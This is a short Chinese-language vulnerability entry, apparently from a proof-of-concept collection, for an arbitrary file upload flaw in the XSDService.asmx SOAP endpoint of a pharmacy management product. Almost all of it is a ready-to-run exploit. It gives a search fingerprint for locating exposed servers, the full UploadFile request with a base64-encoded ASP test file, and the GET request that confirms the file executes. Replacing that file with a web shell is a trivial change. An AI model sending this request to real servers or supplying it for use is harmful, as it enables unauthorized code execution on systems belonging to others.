# 黄药师药业管理软件XSDService.asmx存在任意文件上传漏洞

- **系统**：黄药师药业管理软件　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="XSDService.asmx"`
- **请求**：`POST /XSDService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: 485`　`SOAPAction: "http://tempuri.org/UploadFile"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadFile xmlns="http://tempuri.org/">
<filePath></filePath>
<fileName>test.asp</fileName>
<buffer>PCUgcmVzcG9uc2Uud3JpdGUoIjEyMzQ1NiIpJT4=</buffer>
<Offset>123456</Offset>
</UploadFile>
</soap:Body>
</soap:Envelope>
GET /Upload2015/test.asp HTTP/1.1
```
- **预期**：200　|　—